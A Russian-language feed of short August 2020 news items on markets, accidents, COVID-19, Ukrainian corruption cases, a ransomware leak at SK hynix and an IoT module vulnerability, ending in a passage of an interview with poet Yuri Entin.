Перед открытием торгов фьючерсы на ключевые индексы Европы демонстрируют негативную динамику. В отсутствие важной экономической статистики сегодня инвесторы, скорее всего, займут сдержанную позицию, ожидая предварительные данные по деловой активности в США и ЕС, которые будут опубликованы завтра, считает Роман Антонов, главный аналитик "Промсвязьбанка".
 
Источники

ЦБ РФ 18 августа продал на рынке валюту на 3,1 млрд рублей, следует из данных Банка России. Днем ранее объем продаж валюты также составил 3,1 млрд рублей.
10 марта ЦБ принял решение начать упреждающую продажу иностранной валюты на внутреннем рынке в рамках реализации механизма бюджетного правила, с учетом фактически складывающейся цены нефти и ее влияния на операции Фонда национального благосостояния в апреле.
 
Источники

В Харьковской области в Дергачевском районе вечером 19 августа произошел пожар на предприятии по производству резиновых изделий. Пожар возник в складском здании, где хранились изделия.
Как передает RegioNews, об этом сообщили в пресс-службе ГСЧС Украины.
 
Огонь почти мгновенно охватил значительную площадь и быстро распространялся.
На момент прибытия спасателей огонь распространился на площадь 1000 кв.м. Горело складское помещение с готовой продукцией с резины, крыша цеха литья и часть швейного цеха. В 19:56 пожарные локализовали его.
 
Пострадавших нет, а причина возникновения возгорания выясняется.
Напомним, 15 августа произошел пожар в Хустской районной больнице на Закарпатье. Из-за пожара пришлось эвакуировать 200 человек, из которых 160 - пациенты.
 
Источники

В Армении тестируется новый тип ударных беспилотников местного производства. Об этом министр индустрии высоких технологий Армении Акоп Аршакян написал на своей странице в Facebook.
«Это очередное достижение армянской военной промышленности», - отметил Аршакян.
Он также опубликовал видео тестирования.
В конце июля Аршакян опубликовал очередное видео с полета ударного беспилотника армянского производства.
 
Источники

Директору коммунального предприятия "Днепровский метрополитен" прокуратура сообщила о подозрении в причинении многомиллионных убытков.
Об этом сообщает прокуратура Днепропетровской области, передает RegioNews.
По данным следствия, в июле 2016 года между метрополитеном Днепра и другим акционерным обществом был заключен контракт на завершение строительства метрополитена.
Однако директор метрополитена зная, что подрядчик не имеет достаточного количества работников и техники и отстает от графика, разрешил предприятию получать денежные средства независимо от факта выполнения работ.
 
Кроме того, в контракт были безосновательно включены работы, которые уже выполнены и оплачены государством в 2012 году на общую сумму более 14 млн грн.
Досудебное расследование в уголовном производстве осуществляется Управлением СБУ в Днепропетровской области. Решается вопрос об избрании чиновнику меры пресечения и отстранению от должности.
Напомним, в июле привлекли к криминалу почти сотню коррупционеров. На восьмерых человек наложены дисциплинарные взыскания.
 
Источники

В четверг, 20 августа, Дарницкий районный суд Киева начнет рассмотрение дела относительно тёщи телеведущего Сергея Притулы и депутата Верховной Рады IV, V, VI, VII и VIII созывов Виталия Хомутынника Лилии Сопельник, которая сбила на внедорожнике Mazda женщину с ребенком.
Об этом сообщил адвокат потерпевшей стороны Юрий Сухов, передает RegioNews со ссылкой на « Українські новини».
 
Начало заседания в 11:30. Дело рассмотрит судья Татьяна Щасная.
Известно, что теща Виталия Хомутынника и Сергея Притулы, 59-летняя Лилия Сопельник попала в ДТП 22 августа 2019 года в Дарницком районе Киева.
59-летняя женщина-водитель задним ходом наехала на другую женщину с ребенком, которые проходили сзади. После наезда пострадавшие оказались под авто, машину пришлось поднимать, чтобы достать их оттуда.
Свидетели говорят, что скорее всего, водитель перепутала педали, потому что скорость была очень большая, как для придомовой территории.
Напомним, 11 августа стало известно, что Сергей Притула будет баллотироваться на должность киевского городского головы от партии «Голос».
 
Источники

Вчера, 19 августа, рыночная капитализация американской корпорации Apple впервые превысила отметку в $2 трлн. Так, в ходе сессии акции компании дорожали на 1,4% до $468,65, но затем котировки скорректировались.
Стоит отметить, что производитель iPhone стал первой американской компанией, рыночная стоимость которой превысила этот уровень. Примечательно, что с начала текущего года бумаги Apple "поправились" на 59,24%.
Удорожанию акций компании способствовал стабильный спрос на ее устройства, в частности, на технику для удаленной работы.
Заметим, что отметку в $1 трлн капитализация корпорации Apple впервые преодолела в августе 2018 года, а уровень в $2 трлн удавалось ранее достичь лишь энергетической компании Саудовской Аравии Saudi Aramco.
 
Источники

Операторы вымогательского ПО Maze сообщили о взломе систем южнокорейской компании SK hynix, которая является третьим в мире производителем микросхем (после Intel и Samsung Electronics) и входит в пятерку ведущих производителей оперативной памяти.
На сайте киберпреступников опубликован ZIP-архив размером 570 МБ, который, по словам Maze, представляет собой лишь 5% от похищенных данных. Предположительно, вымогатели похитили около 11 ТБ данных в результате взлома сети южнокорейской корпорации.
Как сообщил источник изданию The Register, архив содержит конфиденциальные соглашения с компанией Apple о поставке флэш-памяти NAND, а также различные персональные и корпоративные файлы.
Группировка Maze в первую очередь известна своим одноименным вымогательским ПО. Операторы взламывают корпоративные сети компаний, похищают конфиденциальные файлы и затем шифруют данные, требуя выкуп за расшифровку. Если жертва отказывается платить выкуп и решает восстановить данные из резервных копий, преступники создают запись на своем «web-сайте утечек» и угрожают опубликовать конфиденциальные данные жертвы после второй попытки вымогательства. Затем жертве дается несколько недель, чтобы обдумать свое решение, и в противном случае Maze публикует файлы на своем портале.
 
Источники

В Правдинском районе перевернулся автобус, который вёз на работу сотрудников свинопроизводства. Об этом "Клопс" сообщил источник в экстренных службах региона, информацию подтвердили в региональном УМВД.
Авария произошла 20 августа в 7:10 на трассе Домново — Ягодное. Со стороны Багратионовска ехал автобус под управлением 56-летнего водителя. По его словам, на ходу лопнуло колесо, машину стало заносить. Шофёр попытался выровнять автобус, но тот ударился о придорожное дерево и перевернулся в кювет. По данным источника в экстренных службах региона, в салоне ехали около 20 человек.
По предварительным данным, пострадали восемь пассажиров, тяжёлых травм у них нет — информация уточняется. Раненых на скорой помощи и попутках доставили в Багратионовскую ЦРБ. Среди них есть трое жителей посёлка Долгоруково — мужчины 56, 52 и 19 лет. У них ссадины, ушибы, подозрения на переломы.
 
Источники

Повторное тестирование на COVID-19 у 72 членов экипажа траулера "Карелия" заболевания не выявило. Об этом сообщили в оперативном штабе по контролю за инфекцией в четверг, 20 августа.
"С 21 августа карантинные мероприятия в отношении судоэкипажа траулера отменены. Управлением Роспотребнадзора по Калининградской области разрешена свободная практика в порту Калининград", — говорится в сообщении.
В оперштабе добавили, что двое ранее заболевших уже выздоровели. Их выписали из инфекционной больницы.
В начале августа в рыбном порту Калининграда пришвартовался траулер "Карелия" с моряками, у которых подозревали COVID-19. Информация о людях и судне — в материале "Клопс".
 
Источники

Мошенники часто используют специальные сервисы  IP-телефонии, чтобы обманывать своих жертв. Руководитель Центра цифровой экспертизы Роскачества Антон Куканов для максимальной безопасности посоветовал не отвечать на звонки с неизвестных номеров, пишет РБКв четверг, 20 августа.
При ответе на звонок абонент вреда себе не причинит. Но если он вступит в диалог с предполагаемым злоумышленником и начнёт выполнять его указания — передаст, например, свои банковские данные и коды из СМС, то шансы лишиться денег возрастают в разы, пояснил эксперт в интервью агентству "Прайм".
Куканов объяснил, что мошенники с помощью специальных программ могут подменять номер телефона, с которого звонят. В результате он может быть похож на номер банка. Чтобы не попасться на эту уловку, рекомендуется прервать диалог и перезвонить по номеру, указанному на обороте карты.
Эксперт призвал также быть внимательными, если звонок поступает с городского номера с кодом, отличным от +7, а также с начинающегося на 8-809. В последнем случае речь идёт о номерах для оказания платных услуг.
Часто мошенники звонят и сразу сбрасывают вызов, чтобы жертва не успела ответить и перезвонила сама. В этом случае можно использовать приложения, определяющие номера телефонов.
"База определителя пополняется за счёт обратной связи пользователей. Мошенники звонят огромному количеству людей и, как правило, используемый ими номер достаточно быстро оказывается помечен как вредоносный", — пояснил Куканов.
Помимо мошенников, определители вычисляют также тех, кто распространяет спам и занимается продвижением услуг банков.
В Калининграде лжесотрудники банка убедили программиста перевести на чужие карты 800 тысяч рублей.
 
Источники

Президент Украины Владимир Зеленский прибыл с рабочей поездкой в ​​Херсонскую область.
Об этом сообщает пресс-служба Офиса президента, передает RegioNews.
Известно, что Зеленсткий примет участие в презентации Стратегии развития Херсонской области.
 
Также в ходе визита Зеленский посетит местные предприятия, осмотрит их производственные мощности, запланировано общение с коллективами.
Напомним, 19 августа стало известно, что Владимир Зеленский планирует посетить Херсонщину.
Также он запланировал в конце августа поехать в предвыборный тур по Украине, в ходе которого будет представлять кандидатов от «Слуг народа» в крупных городах.
 
Источники

Министерство иностранных дел Украины совместно с Украинским Институтом подготовило специальный формат всемирного празднования Дня Независимости Украины – большой онлайн-марафон.
Об этом сообщает RegioNews со ссылкой на Правительственный портал.
Марафон продлится примерно 6 часов. В программе марафона предусмотрено следующее: 
Поздравления со всего мира.
 
Непревзойденные украинские пейзажи.
 
Включение с креативной студии МИД.
 
Украина глазами японского туриста в фильме "Спасибо".
 
Знакомство с украинскими фэшн-брендами и многое другое.
Отмечается, что язык онлайн-марафона – английский.
Онлайн-марафон будет транслироваться на официальной странице в фейсбук и на страницах украинских посольств.
 
Напомним, что во время празднования 29-й годовщины независимости Украины и Дня Государственного Флага в Киеве состоится ряд торжественных, культурно-художественных и спортивных событий.
 
Источники

Специалисты компании IBM предупредили о потенциально опасной уязвимости в коммуникационном модуле производства компании Thales, реализованном в миллионах IoT-устройств, включая используемые в энергетическом и телекоммуникационном секторах, сфере здравоохранения и автопроме.
Изначально уязвимость (CVE-2020-15858) была обнаружена в модели Thales Cinterion EHS8 M2M, обеспечивающей безопасное подключение по 3G и 4G в устройствах «Интернета вещей», однако позже оказалось, что проблеме подвержены еще десять моделей в продуктовой линейке EHS8 (BGS5, EHS5/6/8, PDS5/6/8, ELS61, ELS81, PLS62).
Проблема заключается в том, что продукт использует Java-код, который может содержать такие данные как ключи шифрования, пароли и сертификаты. Таким образом злоумышленник с доступом к целевому устройству может с помощью CVE-2020-15858 обойти механизмы безопасности получить доступ к важной информации и использовать ее для управления устройством или сеть, в которой оно находится. В некоторых случаях возможна удаленная эксплуатация через функции связи в самом модуле, отметили специалисты.
По их словам, последствия атаки зависят от сферы применения целевого IoT-устройства. К примеру, злоумышленник может взломать медоборудование (инсулиновые помпы и т. д.) и манипулировать им, либо скомпрометировать смарт-счетчики электроэнергии и изменить их показатели.
«Имея доступ к большому количеству таких устройств, злоумышленник также может отключить счетчики для всего города, что может привести к широкомасштабным блэкаутам, требующим индивидуальных выездов на ремонт или, что еще хуже, повредить саму энергосеть», - предупредили исследователи.
Хотя уязвимость была исправлена еще в феврале нынешнего года, процесс обновления некоторых устройств, например, медицинского оборудования или АСУ ТП, является непростой задачей, отметила IBM. Установка патча осуществляется либо посредством обновления через USB-подключения, либо «по воздуху», в зависимости от возможностей устройства.
 
Источники

Американская компания Synopsys, являющаяся мировым лидером в разработке электронных систем проектирования и IP блоков, используемых для проектирования, верификации и производства электронных компонентов и систем, представила финансовые результаты за третий фискальный квартал, в соответствии с которыми чистая прибыль составила $252,9 млн или $1,62 на акцию по сравнению с $99,9 млн или 65 центами на бумагу годом ранее.
Скорректированная прибыль, в свою очередь, увеличилась с $182,5 млн или $1,18 на акцию годом ранее до $271,9 млн или $1,74 на бумагу. Аналитики в среднем прогнозировали показатель на уровне $1,34 в расчете на акцию.
Выручка, тем временем, возросла с $853 млн годом ранее до $964,1 млн, в то время как аналитики ожидали $894,12 млн.
По оценкам компании, скорректированная прибыль в четвертом фискальном квартале составит $1,51-1,56 на акцию, а выручка порядка $1,0-1,03 млрд, при этом по итогам всего финансового года ожидается скорректированная прибыль в размере $5,48-5,53 на бумагу при выручке в $3,66-3,69 млрд.
 
Источники

В Калининградской области скончался ещё один пациент с коронавирусом. Об этом сообщает региональный оперативный штаб по контролю за инфекцией в четверг, 20 августа.
По результатам патологоанатомических заключений количество летальных случаев — 62. Умер мужчина 65 лет, пенсионер, крайне тяжёлая пневмония на фоне хронического заболевания желудочно-кишечной и сердечно-сосудистой систем", — добавили в оперштабе.
В Калининградской области выявлено 15 случаев COVID-19 за сутки. Выписали шесть человек.
 
Источники

В Балтийске 25-летний житель Гурьевского района чуть не утонул в районе памятника Елизавете. Об этом сообщает пресс-служба администрации городского округа "ВКонтакте".
Мужчина запутался в стропах кайта и начал уходить под воду. Спасатели доставили пострадавшего на берег.
 
Источники

Пользователи электронной почты Gmail и сервиса хранения файлов Google Drive из разных стран мира 20 августа пожаловались на сбой в работе приложений.
По большей степени с проблемами столкнулись жители Австралии, Япония и США, однако в Армении также у пользователей наблюдаются неполадки.
Примерно 40% пользователей, обратившихся с жалобами на сбой, столкнулись с невозможностью авторизоваться на Gmail. Кроме того, у 34% не выходит получить отправленные сообщения. Еще 25% испытывают проблемы с прикрепленными файлами, пишет Engadget.
В Google сообщили, что работают над устранением проблем.
 
Источники

Служба безопасности Украины выявила многомиллионную коррупционную схему при закупках для ремонта пассажирского подвижного состава Укрзализныци.
Об этом сообщает пресс служба СБУ, передает RegioNews.
По данным следствия, в течение 2019-2020 годов филиал "Укрзализныци" выделила более 60 млн гривен для закупки запчастей для ремонта пассажирского подвижного состава.
 
Победителями тендерных торгов стали подконтрольные организаторам тендеров структуры, которым "Укрзализныця" перечислила всю сумму.
СБУ провела экспертизы, которые подтвердили безосновательное завышение стоимости запчастей, нанесло ущерб государству на почти 12 миллионов гривен.
 
Напомним, генпрокуратура открыла уголовное производство против "слуги народа" Геруса, дело касается поставок электроэнергии в "Укрзализныцю".
Также в Днепре директора метрополитена подозревают в махинациях на 240 млн грн, чиновника подозревают в служебной халатности, дело расследует СБУ.
 
Источники

Мэр Умани Александр Цебрий, который недавно переночевал на Банковой, чтобы добиться встречи с Зеленским и решения проблемы с хасидами-паломниками в его городе, заявил, что вопрос рассмотрят на внеочередном заседании Кабмина 20 августа. 
Об этом он сказал в комментарии «Стране »:
 
В свою очередь, Антон Геращенко, замминистра внутренних дел сообщил изданию, что решение по хасидам будет принято на очередном заседании.
 
17 августа мэр Умани Александр Цебрий, который предложил заблокировать въезды в город, чтобы не пустить хасидов, приехал в Киев под Офис президента Украины, чтобы встретиться с Владимиром Зеленским для предотвращения массового приезда хасидов в Умань.
Также мэр Умани рассказал, как провел ночь под ОП в ожидании Зеленского.
 
Источники

Мэр столицы Виталий Кличко сообщает, что новый учебный год в городе начнется 1 сентября в понятном для общества формате обучения, а дальше все будет завесить от организованности и сплоченности жителей города.
Как передает RegioNews, об этом он рассказал в ходе Августовской педагогической онлайн-конференции.
 
По его словам, новый учебный год в Киеве будет начат 1 сентября в обычном и понятном для общества формате обучения. Кроме того, все будет завесить и от организованности, и от сплоченности жителей города.
Напомним, премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения и Министерству образования провести проверки школ и детских садов на соблюдение безопасных условий обучения в период карантина.
 
Источники

В Калининградской области среди новых пациентов с COVID-19 оказался пятилетний ребёнок. Об этом сообщает региональный оперативный штаб по контролю за инфекцией в четверг, 20 августа.
Среди заболевших:
— сотрудник таможни (в отпуске)", — добавили в оперштабе.
У пяти заболевших заболевание протекает в форме ОРВИ, ещё у пяти диагностирована пневмония. У пяти человек инфекция выявлена по результатам тестирования контактных в семье, по месту работы, а также при профилактическом обследовании.
О 15 новых случаях стало известно утром в четверг. Скончался 65-летний мужчина с коронавирусом.
 
Источники

Российская Генеральная прокуратура продолжает блокировать почтовые сервисы, с которых неизвестными рассылаются сообщения о лжеминированиях. Так, в списке последних провинившихся анонимных ресурсов оказались anonymousspeech.com и vistomail.com:
Интересен тот факт, что в 2008 году была опубликована «Белая книга» биткоина под авторством Сатоши Накамото, анонимная рассылка которой происходила посредством сервиса vistomail.com.
 
В письме содержалась ссылка на 9-страничный текст white paper, озаглавленного Bitcoin: A Peer-to-Peer Electronic Cash System («Биткоин: Одноранговая электронная денежная система»).
В этом документе в строгом академическом стиле и была описана технология новой денежной системы, которой автор присвоил название Bitcoin. А до этого на на anonymousspeech.com был зарегистрирован домен Bitcoin.org, где и был впоследствии выложен для широкой публики документ. Впоследствии Сатоши Накамото в переписке с разработчиками утверждал, что выкупил этот домен, хотя и не уточнил, у кого именно.
 
Источники

Чистая прибыль "Газпром нефти" по МСФО '''во 2 квартале 2020 года '''составила 22 млрд рублей против убытка в размере 13,806 млрд рублей в 1 квартале 2020 года. Об этом сообщила компания.
Выручка в апреле-июне снизилась на 22,6% к/к - до 398,265 млрд рублей.
EBITDA снизилась на 18,2% - до 66,555 млрд рублей. Скорректированная EBITDA снизилась на 16,4% к/к и составила 82,866 млрд руб.
'''По итогам 1 полугодия''' прибыль упала на 96,2% г/г - до 8,232 млрд рублей.
Выручка в январе-июне снизилась на 24,8% г/г - до 912,833 млрд рублей.
EBITDA упала на 59,9% - до 147,931 млрд рублей.&nbsp;Скорректированная EBITDA снизилась на 55,4% г/г - до 181,98 млрд рублей.
 
Источники

В Калининграде из-за сообщений о минировании снова эвакуируют суды. Письма в организации прислали по электронной почте, сообщили "Клопс" в пресс-службе регионального правительства в четверг, 20 августа.
Снова эвакуируют из-за веерной рассылки о минировании. Как и прошлый раз", — подчеркнули в пресс-службе.
На прошлой неделе в Калиннградской области суды "минировали" два дня подряд. Сообщения о бомбах поступали 13 и 14 августа.
 
Источники

Тагилстроевский районный суд Нижнего Тагила отказал в условно-досрочном освобождении фигуранту «московского дела» Кириллу Жукову, осужденному на три года колонии общего режима за то, что пытался поднять забрало на шлеме нацгвардейца на акции 27 июля. Об этом сообщает глава Международной правозащитной группы «Агора» Павел Чиков.
Таким образом, суд отказал в апелляции об УДО Жукову, с которой обратился адвокат «Агоры» Алексей Бушмаков. Ранее Жукова признали виновным в применении насилия к представителю власти (ч. 1 ст. 318 УК).
На прениях руководство исправительной колонии № 13, в которой осужденный отбывает наказание, выступило против досрочного освобождения. В характеристике на Жукова из колонии сказано, что он якобы склонен к нападению на сотрудников правоохранительных органов.
«Осужденный Жуков Кирилл Сергеевич за время отбывания наказания в учреждении характеризуется посредственно, поощрений от администрации учреждения не имеет, совершил преступление высокой общественной опасности. На основании вышеизложенного условно-досрочного освобождения осужденного не целесообразно», — приводит текст характеристики Павел Чиков.
27 июля в Москве состоялась несогласованная акция в поддержку незарегистрированных кандидатов в Мосгордуму. На ней задержали не менее 1373 человек. После акции возбудили уголовные дела по статьям о массовых беспорядках (ст. 212 УК) и применении насилия к представителям власти (ст. 318 УК).
В ходе противостояния которое возникло между силовиками в амуниции и протестующими, Жуков попытался поднять забрало нацгвардейца, отчего тот якобы испытал физическую боль. На суде потерпевший просил не назначать Жукову строгое наказание. В сентябре 2019 года Жукова приговорили к трем годам колонии.
 
Источники

В Вооруженных силах Украины за 19 августа зарегистрировано 42 новых случая заболевания острой респираторной болезнью COVID-19. Из заболевших в учреждениях здравоохранения находится 9 человек, а остальные 33 человека пребывают дома под наблюдением медиков.
Об этом сообщает RegioNews со ссылкой на пресс-службу командования Медицинских Сил ВСУ.
 
Ранее сообщалось, что 19 августа заразились коронавирусом 2 134 человек, умерли 40 пациентов, были госпитализированы 407 человек.
Читайте также: Коронавирус в Украине: хроника (обновляется)
 
Источники

Концерт состоится в Пловдивском античном театре &ndash; в одном из наиболее хорошо сохранившихся римских театров,&nbsp; расположенном в самом центре города Пловдив. Предположительно, он был построен с 114 по 117 год нашей эры по указанию императора Марка Траяна и обнаружен в ходе археологических раскопок, проводившихся с 1968 по 1979 год.
&laquo;Симфония № 7&raquo; выдающегося русского композитора Дмитрия Шостаковича, написанная в годы Второй мировой войны, уже стала главной музыкальной темой проекта "Музыка Мира".&nbsp; В 1941 году это произведение облетело весь мир и вселило надежду в сердца людей, сегодня проект "Музыка Мира" продолжает этот международный музыкальный диалог о мире.
Прямая трансляция концерта состоится на нескольких площадках и телевизионных каналах.&nbsp; Для российской публики трансляция организована на сайте социальной сети&nbsp;'''Одноклассники'''&nbsp;и на '''сайте организатора '''.
 
Источники

В школах Харьковской области в связи с распространением коронавируса не будут проводить торжественные школьные линейки 1 сентября.
Об этом сообщает пресс-служба Харьковской ОГА, передает RegioNews.
 
В облгосадминистрации добавили, что эту информацию уже донесли до сведения руководства школ области.
Информации о том, будут ли проводить торжества 1 сентября в школах города Харькова, пока нет.
Напомним, Кличко заверил, что учебный год 1 сентября начнется в "понятном" формате.
 
Источники

Министр цифровой трансформации Михаил Федоров привел данные относительно обращения украинцев за административными услугами в 2020 году.
Об этом Федоров сообщил в Facebook, пишет RegioNews.
По его данным, с начала года украинцы обращались за админуслугами 6,5 млн раз, из них во втором квартале — 2,9 млн.
В течение второго квартала наибольшим спросом пользовались услуги по регистрации места жительства (26 %), земельные услуги (17 %) и оформление паспортных документов (5 %).
Министр также отметил, что доступ к получению услуг упрощается.
 
Уже больше половины ЦПАУ работают при органах местного самоуправления, добавил он. Трансформация ЦПАУ при районных госадминистрациях в центры при ОМС позволит избежать дублирования услуг там, где они работают одновременно, а также оптимизировать использование публичных ресурсов.
Лидерами по количеству точек доступа к услугам являются Ивано-Франковская (79), Днепропетровская (78) и Запорожская области (72). 617 ЦПАУ обеспечены электронным документооборотом и информационными системами.
Ранее сообщалось, что Черновцы, Харьков и Одесса оказались самыми коррумпированными городами Украины.
 
Источники

"ЛУКОЙЛ" запустил в Пермском крае газотурбинную электростанцию для полезной утилизации попутного нефтяного газа, сообщила компания.
На ГТЭС"Чашкино" мощностью 16 МВт будет использоваться около 50 млн куб. м ПНГ в год с месторождений компании. Основной объем выработанной электроэнергии будет направляться на собственные производственные объекты "ЛУКОЙЛа", что позволит сократить закупки электроэнергии и, соответственно, снизить косвенные энергетические выбросы парниковых газов на 49 тыс. т СО2-эквивалента.
Также предполагаются поставки электроэнергии во внешнюю сеть, что позволит закрыть до 2% от общего потребления Березниковско-Соликамского энергоузла. Для передачи электроэнергии в сеть на "Чашкино" ранее была возведена цифровая подстанция &ndash; первая для "ЛУКОЙЛа".
 
Источники

]]
Учёные РАН предположили, что загадочные объекты, снятые космонавтом МКС, могут быть связаны со SpaceX Илона Маска.
Эксперты считают, что НЛО — это спутники системы связи Starlink. Научный сотрудник отдела Института космических исследований РАН Натан Эйсмонт выразил мнение, что космонавт снял блики этих аппаратов:
 
Эту версию поддержал заместитель директора по научной работе Института астрономии РАН Михаил Сачков:
 
Сачков предложил уточнить время запуска спутников. Это поможет подтвердить, что на кадрах находятся именно они.
Космонавт Иван Вагнер снял на видео пик полярного сияния над Антарктидой и группу из пяти НЛО.
 
Источники

В Правдинском районе перевернулся автобус, который вёз на работу сотрудников свинопроизводства. Об этом "Клопс" сообщил источник в экстренных службах региона, информацию подтвердили в региональном УМВД.
Авария произошла 20 августа в 7:10 на трассе Домново — Ягодное. Со стороны Багратионовска ехал автобус под управлением 56-летнего водителя. По его словам, на ходу лопнуло колесо, машину стало заносить. Шофёр попытался выровнять автобус, но тот ударился о придорожное дерево и перевернулся в кювет. По данным источника в экстренных службах региона, в салоне ехали около 20 человек.
По предварительным данным, пострадали восемь пассажиров, тяжёлых травм у них нет — информация уточняется. Раненых на скорой помощи и попутках доставили в Багратионовскую ЦРБ. Среди них есть трое жителей посёлка Долгоруково — мужчины 56, 52 и 19 лет. У них ссадины, ушибы, подозрения на переломы.
В пресс-службе УМВД сообщили, что в автобусе находились 15 человек. За медицинской помощью обратились четверо.
 
Источники

Вчера, 19 августа, состоялась публикация протокола июльского заседания Комитета по открытым рынкам ФРС, в котором отмечается, что существует высокая неопределенность в отношении перспектив развития американской экономики в связи с пандемией коронавирусной инфекции.
Участники заседания высказали мнение о том, что американской экономике, скорее всего, понадобится дополнительная поддержка, однако пока не определились с тем, когда им стоит начать использование новых инструментов. При этом члены FOMC сошлись во мнении, что дальнейшие перспективы экономики США в значительной степени зависят от эпидемиологической ситуации в стране, а также от мер, принимаемых правительством для сдерживания дальнейшего распространения коронавируса.
Некоторые представители FOMC высказались за применение мощных фискальных стимулов для содействия быстрому улучшению условий на рынке труда. &nbsp;В то же время многие участники заседания отметили, что в определенный момент может появиться необходимость внесения большей ясности в планы ФРС относительно будущего направления процентных ставок и курса денежно-кредитной политики.
 
Источники

#REDIRECT«Минутки» ФРС показали, что члены FOMC обеспокоены высокой неопределенностью в отношении перспектив развития американской экономики

]]
Советский и российский драматург, поэт-песенник, сценарист Юрий Энтин 21 августа 2020 года отметит 85-летие.
Юрий Сергеевич рассказал «Ревизору.ру» о том, как стал «свободным художником», о кризисе детской песни, о бытовых чудесах и своей миссии в жизни.
'''Поэт становится поэтом с детства, или когда начать не столь уж важно?'''
По словам моей мамы, я начал писать в шесть лет. После того, как научился играть в шашки, мне подарили их на день рождения, и я вызвал на бой 16-летнего мальчика. Собрался весь двор, мы решили играть до пяти. Выиграл у него подряд три партии, и он выбросил мои шашки в люк. Я сказал: «Безобразник и злюка, достань шашки из люка!» Мама это записала и позже показала мне. Хвасталась всем, что её сын будет поэтом.
'''Как настроение перед юбилеем у 85-летнего поэта?'''
Мне кажется, что цифра 85 за пределами старости — есть старость, а есть опасная черта. Но настроение у меня деятельное, работаю с утра до ночи, начинаю новую жизнь.
'''В чём она заключается?'''
Изучил интернет и теперь перехожу на эту платформу. В течение года у меня на сайте будут представлены 13 пьес, также будут интервью и ответы на вопросы. Я расскажу о фильмах, в которых использовались мои песни, покажу их. Даже сам поздравлю себя с днём рождения.
'''У вас вышла новая книга, «Домашний театр», на сайте будет информация об этом?'''
У меня целая передача в сети построена на этой книге, но таких книг у меня уже написано три. Они не выходят пока только из-за того, что я не могу найти художника, который смог бы почувствовать произведения и проиллюстрировать их.
'''В своей биографии вы пишите, что резко изменили свою жизнь в 33 года. Вы стали «свободным художником». Расскажите об этом переломном моменте?'''
Я работал на фирме «Мелодия» редактором детского отделения. Тогда уже писал стихи, но не серьёзно. Так получилось, что Геннадий Гладков начал работать на киностудии «Союзмультфильм». Первые несколько песен я написал для «Бременских музыкантов» вместе с Василием Ливановым, и познакомился с Гладковым, который спел мне по телефону «Ничего на свете лучше нету». В тот же день я написал заявление об уходе с «Мелодии». С тех пор и сочиняю песни. Были написаны «Антошка», «Чунга-чанга». Каждая моя песня становилась популярной, «Лучшей песней года». Тут и «Вернись лесной олень», и «Крылатые качели» (песня, кстати, написана об «Измайловском парке»). 
Но в 84 году детская песня умерла, никому в тот год не дали за нее премии, и с тех пор детской песни больше нет, её некуда отнести, даже если появятся идеи. Свою задачу сегодня я вижу в том, чтобы создать виртуальный музей детской песни.
'''И все же, почему пропала детская песня? Премия ведь не причина.'''
Первый мощный удар был, когда запретили давать рекламу в детских передачах, после чего они все закрылись. Сейчас вернули, но уже поздно. Я боролся с этим, все мои силы были направлены на восстановление ситуации.
Часть жизни я отдал на то, чтобы встречаться с руководителями нашей страны, со всеми популярными продюсерами, руководителями телевидения, разговаривать, объяснять. Ничто не могло спасти ситуацию, в стране национальная идея — не коммунизм, а деньги. Погиб даже детский хор имени Попова. А там работали талантливейшие люди.
'''Всю жизнь вы смешите детей. Сегодняшние дети сильно отличаются от тех, что были 20 лет назад?'''
Дети не меняются, особенно малыши. Они открыты миру. Когда я начал писать, первые же песни стали известными, думаю, потому что я никогда не сюсюкал. И не писал их специально для детей. Я создавал образы, интересные каждому. Кстати, на «Бременских музыкантах» в кинотеатре ни одного ребёнка не было — туда рвалась молодёжь, они чувствовали дух «Битлз», новую аранжировку. А разве «Лесной олень» — детская песня? Взрослые любят её куда больше.
Детская литература в советское время была шикарной — я помню стихи, которые были до войны. Чуковский, Барто. Эти стихи и песни пел весь мир, их знал каждый ребёнок. Все композиторы, с которыми я сотрудничал, опирались на мировую культуру, многие из них преподавали в консерваториях.
'''Говорят, секрет вашего успеха в том, что вы — вечный ребёнок в душе. Так ли это?'''
Это нужно спросить у жены. Я не считаю себя пишущим для детей. На афише мюзикла «Алёна против дракона» я попросил указать: «Мюзикл для взрослых и детей». 13-го сентября он пойдёт в консерватории.
'''У вас ведь есть дети, внуки, расскажите о них?'''
У меня четыре правнука, они уже серьёзные люди. А дочка давно на пенсии.
'''Что помогает вам жить счастливо столько лет? Спортом ведь не занимались?'''
Ну почему? Я был волейболистом, бегал на короткие дистанции, преподавал физкультуру и историю в школе — закончил два факультета педагогического института. Я был спортивный, но потом забросил. Что мне помогает? Просто не знаю. Кажется, что я сам на себя возложил некую миссию — сохранить детскую песню. Вот поехал в город Кёльн, где проживал тогда Давид Тухманов — лучший мелодист в мире — уговорил бесплатно сочинять детские песни — вышла книга с нотами, 101 наша песня. Сборник «Игра в классики» — это песни на самые известные классические мелодии Баха, Бетховена, Моцарта, Чайковского, Листа, Шуберта, которые знает каждый. Я написал стихи на музыку, а Давид Тухманов сделал аранжировку. Среди тех, кто спел партии — Тамара Гвердцители, Вячеслав Войнаровский, Николай Басков, Иосиф Кобзон. Хазанов говорил, что в машине теперь слушает только эти мелодии, действует как наркотик.
Все эти записи у меня есть, они будут опубликованы в интернете на моей страничке в Фейсбуке.
'''Каким главным качеством нужно обладать человеку, чтобы писать для детей?'''
Быть искренним. Самый искренний писатель — Эдуард Успенский, в каком-то смысле он был моим учителем. Мы дружили с ним всю жизнь — я полюбил его «Крокодила Гену», он писал свободно, не сюсюкал и будил фантазию детей. Могу сказать, что и я пишу искренне. И доверяю детям, они обладают врождённым чувством юмора. Улыбаются, когда им что-то нравится, плачут, когда все не так. Я писал для своей 2-летней дочки стихи, после мы с Тухмановым написали множество песен для самых маленьких. Они, кстати, так и не изданы.
'''Дети верят в сказки, с детскими писателями чудеса в жизни случаются? '''
